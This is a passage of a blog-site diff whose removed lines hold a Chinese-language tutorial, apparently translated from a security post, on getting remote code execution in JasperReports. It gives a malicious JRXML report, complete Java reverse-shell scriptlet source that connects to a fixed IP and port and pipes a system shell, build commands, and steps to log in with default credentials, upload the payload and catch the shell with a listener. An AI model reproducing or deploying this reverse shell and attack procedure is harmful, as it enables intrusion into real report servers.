class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"e48d7dee-a092-45ea-8bd8-8440f76a9fd0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"5"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;phone_office&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:column</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">uuid</span>=<span class="string">"f0397b7d-4130-4b13-88b1-d89415b269bd"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:columnHeader</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"PageHeader"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">mode</span>=<span class="string">"Opaque"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"4"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"16"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"0a1206b8-d0d6-4809-a424-3d7f09606b44"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.th"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA["Address"]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnHeader</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">jr:detailCell</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">rowSpan</span>=<span class="string">"1"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textField</span> <span class="attr">isStretchWithOverflow</span>=<span class="string">"true"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">reportElement</span> <span class="attr">style</span>=<span class="string">"detail"</span> <span class="attr">positionType</span>=<span class="string">"Float"</span> <span class="attr">stretchType</span>=<span class="string">"RelativeToBandHeight"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"145"</span> <span class="attr">height</span>=<span class="string">"20"</span> <span class="attr">isPrintWhenDetailOverflows</span>=<span class="string">"true"</span> <span class="attr">uuid</span>=<span class="string">"7bc63c7e-0224-441b-96ec-8a1bb67a0b84"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"net.sf.jasperreports.export.pdf.tag.td"</span> <span class="attr">value</span>=<span class="string">"full"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">reportElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">box</span> <span class="attr">topPadding</span>=<span class="string">"4"</span> <span class="attr">leftPadding</span>=<span class="string">"0"</span> <span class="attr">bottomPadding</span>=<span class="string">"0"</span> <span class="attr">rightPadding</span>=<span class="string">"0"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">bottomPen</span> <span class="attr">lineWidth</span>=<span class="string">"1.0"</span> <span class="attr">lineStyle</span>=<span class="string">"Solid"</span> <span class="attr">lineColor</span>=<span class="string">"#808080"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">box</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$F&#123;billing_address_street&#125;]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">textField</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:detailCell</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:column</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:columnGroup</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jr:table</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">componentElement</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">band</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">summary</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">jasperReport</span>&gt;</span></div><div class="line"></div><div class="line">接下来看42行：</div><div class="line"><span class="tag">&lt;<span class="name">textFieldExpression</span>&gt;</span>&lt;![CDATA[$P&#123;ShellScriptlet_SCRIPTLET&#125;.getShell()]]&gt;<span class="tag">&lt;/<span class="name">textFieldExpression</span>&gt;</span></div><div class="line"></div><div class="line">这里我们调用一个getshell的方法在ShellScriptlet_SCRIPTLET。在35行我们定义了一个ShellScriptlet_SCRIPTLET 来引用“foxglove.shell.ShellScriptlet”中的Java代码。</div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">scriptlet</span> <span class="attr">name</span>=<span class="string">"ShellScriptlet"</span> <span class="attr">class</span>=<span class="string">"foxglove.shell.ShellScriptlet"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">scriptletDescription</span>&gt;</span>&lt;![CDATA[]]&gt;<span class="tag">&lt;/<span class="name">scriptletDescription</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">scriptlet</span>&gt;</span></div></pre></td></tr></table></figure>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div></pre></td><td class="code"><pre><div class="line">这很简单,但这在Java代码本身是如何定义的呢?</div><div class="line"></div><div class="line">编写攻击脚本</div><div class="line"></div><div class="line">scriptlet用Java编写,需要去扩展“JRDefaultScriptlet”。我从<span class="string">"here"</span>中借用了一些Java代码来反弹shell并且让这种攻击脚本成为跨平台的。下面就是结果了，要注意“host”和“port”的写法是固定的：</div><div class="line"></div><div class="line"><span class="keyword">package</span> foxglove.shell;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"><span class="keyword">import</span> java.net.*;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.OutputStream;</div><div class="line"><span class="keyword">import</span> java.io.DataInputStream;</div><div class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRDefaultScriptlet;</div><div class="line"><span class="keyword">import</span> net.sf.jasperreports.engine.JRScriptletException;</div><div class="line"> </div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShellScriptlet</span> <span class="keyword">extends</span> <span class="title">JRDefaultScriptlet</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</div><div class="line">   Socket socket;</div><div class="line"> </div><div class="line">   PrintWriter socketWrite;</div><div class="line">   BufferedReader socketRead;</div><div class="line"> </div><div class="line">   PrintWriter commandWrite;</div><div class="line">   BufferedReader commandRead;</div><div class="line"> </div><div class="line">   <span class="keyword">static</span> String ip;</div><div class="line">   <span class="keyword">int</span> port = <span class="number">8080</span>;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getShell</span><span class="params">()</span></span>&#123;</div><div class="line">      ip = <span class="string">"1.1.1.1"</span>;</div><div class="line">      ShellScriptlet shell = <span class="keyword">new</span> ShellScriptlet();</div><div class="line">      shell.establishConnection();</div><div class="line">      <span class="keyword">new</span> Thread(shell).start();</div><div class="line">      shell.getCommand();</div><div class="line">      <span class="keyword">return</span> <span class="string">"DONE"</span>;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</div><div class="line">      spawnShell();</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spawnShell</span><span class="params">()</span></span>&#123;</div><div class="line">      <span class="keyword">boolean</span> windows = <span class="keyword">false</span>;</div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         <span class="keyword">if</span> ( System.getProperty(<span class="string">"os.name"</span>).toLowerCase().indexOf(<span class="string">"windows"</span>) != -<span class="number">1</span>)&#123;</div><div class="line">            windows = <span class="keyword">true</span>;</div><div class="line">         &#125;</div><div class="line"> </div><div class="line">         Runtime rt = Runtime.getRuntime();</div><div class="line">         Process p;</div><div class="line">         <span class="keyword">if</span>(windows) p = rt.exec(<span class="string">"C:\\Windows\\System32\\cmd.exe"</span>);</div><div class="line">         <span class="keyword">else</span> p = rt.exec(<span class="string">"/bin/sh"</span>);</div><div class="line"> </div><div class="line">         InputStream readme = p.getInputStream();</div><div class="line">         OutputStream writeme = p.getOutputStream();</div><div class="line">         commandWrite = <span class="keyword">new</span> PrintWriter(writeme);</div><div class="line">         commandRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(readme));</div><div class="line"> </div><div class="line">         <span class="keyword">if</span>(windows) commandWrite.println(<span class="string">"dir"</span>);</div><div class="line">         <span class="keyword">else</span> commandWrite.println(<span class="string">"ls -al"</span>);</div><div class="line"> </div><div class="line">         commandWrite.flush();</div><div class="line"> </div><div class="line">         String line;</div><div class="line">         <span class="keyword">while</span>((line = commandRead.readLine()) != <span class="keyword">null</span>)&#123;</div><div class="line">            socketWrite.println(line);</div><div class="line">            socketWrite.flush();</div><div class="line">         &#125;</div><div class="line"> </div><div class="line">         p.destroy();</div><div class="line"> </div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line"> </div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">establishConnection</span><span class="params">()</span></span>&#123;</div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         socket = <span class="keyword">new</span> Socket(ip,port);</div><div class="line">         socketWrite = <span class="keyword">new</span> PrintWriter(socket.getOutputStream(),<span class="keyword">true</span>);</div><div class="line">         socketRead = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(socket.getInputStream()));</div><div class="line">         socketWrite.println(<span class="string">"---Connection has been established---"</span>);</div><div class="line">         socketWrite.flush();</div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line"> </div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCommand</span><span class="params">()</span></span>&#123;</div><div class="line">      String foo;</div><div class="line"> </div><div class="line">      <span class="keyword">try</span>&#123;</div><div class="line">         <span class="keyword">while</span>((foo=socketRead.readLine())!= <span class="keyword">null</span>)&#123;</div><div class="line">            commandWrite.println(foo);</div><div class="line">            commandWrite.flush();</div><div class="line">         &#125;</div><div class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</div><div class="line">   &#125;</div><div class="line"> </div><div class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</div><div class="line">      ShellScriptlet r = <span class="keyword">new</span> ShellScriptlet();</div><div class="line">      r.getShell();</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>对于那些不熟悉Java的,你可以用下面的命令编译在相同的目录中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/javac -Xlint -cp .:jasperreports-5.0.0.jar *.java -d .</div></pre></td></tr></table></figure>
-<p>这里指定” javac “的完整路径是有原因的(这是Java 1.6)。如果你运行这个命令对某种系统会出错,你需要考虑理想情况下用相同的环境来编译它，至少不是最新的版本！</p>
-<p>接下来我们要做的就是把所有的代码打包趁有个jar文件然后上传到目标站点。你可以使用下面这个代码来完成它：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/lib/jvm/java-6-openjdk-amd64/bin/jar cvf shell.jar foxglove/</div></pre></td></tr></table></figure>
-<p>如果一切进行的顺利，你就会得到个“shell.jar”文件，接下来就准备上传这个到目标站点吧！</p>
-<h4 id="部署这个新的“Report”"><a href="#部署这个新的“Report”" class="headerlink" title="部署这个新的“Report”"></a>部署这个新的“Report”</h4><p>每个版本的JasperReports似乎都有些不同，但是他们都有相同的函数和工作流。</p>
-<p>首先很明显我们要去验证一下“jasperadmin/jasperadmin”：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/authd.png?w=960" alt="authd.png"></p>
-<p>在我这个版本中，这就立即显示出了有一堆reports样例的“Repository”（要确保“Type”这一列说的是“Report”）。</p>
-<p>接下来，我们只要右击一个report并且点击“Edit”就好。</p>
-<p>一开始，就点击 “Controls and Resources” 之后点击“Add Resource”。上传我们之前创建的JAR文件并给这个资源命名为“ShellScriptlet”。结束之后我们应该可以看到下图这样的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resource.png?w=960" alt="resource.png"></p>
-<p>点击左侧栏的“Set Up”，单击 “Upload a Local file”把我们之前创建的JRXML文件上传了。你应该可以得到下图所示的结果：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resources2.png?w=960" alt="resources2"></p>
-<p>Jasper 现在让我们去定义一些我们在JRXML文件引用的资源。如果你是一个keener你可能会仅仅把这些资源从JRXML文件中删除。仅仅单击“Add Now”并且上传一些随机的PNG图片文件为你每一个引用资源…当你做完这些应该看起来像下图一样：<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/resourcesadded.png?w=960" alt="resourcesadded"></p>
-<p>现在你只需要点击“Submit”在这个按钮来创建我们的恶意report就好了。哈哈</p>
-<h4 id="Shellz"><a href="#Shellz" class="headerlink" title="Shellz!"></a>Shellz!</h4><p>先别激动，在你运行这个report之前，你还要开个监听端口去捕捉你的shell！！！<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/listener.png?w=960" alt="listener.png"></p>
-<p>之后单击你创建的report，它将会运行Java代码，如果没有什么问题，你就可以看到反弹的shell了。</p>
-<p><img src="https://foxglovesecurity.files.wordpress.com/2016/10/shell1.png?w=960" alt="shell"></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -2092,7 +2200,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">30</span>
+                <span class="site-state-item-count">31</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
